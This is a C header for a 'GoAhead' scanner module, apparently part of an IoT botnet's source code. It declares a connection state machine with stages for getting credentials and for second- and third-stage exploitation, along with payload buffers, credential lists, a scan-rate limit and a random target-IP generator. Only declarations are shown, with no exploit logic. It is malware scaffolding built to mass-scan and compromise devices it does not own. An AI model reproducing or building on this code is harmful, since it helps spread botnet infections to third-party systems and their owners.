#ifndef _GOAHEAD_SCAN_H
#define _GOAHEAD_SCAN_H

#include <stdint.h>
#include "includes.h"

#define GOAHEAD_SCANNER_MAX_CONNS 128
#define GOAHEAD_SCANNER_RAW_PPS 160

#define GOAHEAD_SCANNER_RDBUF_SIZE 256
#define GOAHEAD_SCANNER_HACK_DRAIN 64

struct goahead_scanner_connection
{
    int fd, last_recv;
    enum
    {
        GOAHEAD_SC_CLOSED,
        GOAHEAD_SC_CONNECTING,
        GOAHEAD_SC_GET_CREDENTIALS,
        GOAHEAD_SC_EXPLOIT_STAGE2,
        GOAHEAD_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[GOAHEAD_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void goahead_init(void);
void goahead_kill(void);

static void goahead_setup_connection(struct goahead_scanner_connection *);
static ipv4_t goahead_get_random_ip(void);

#endif
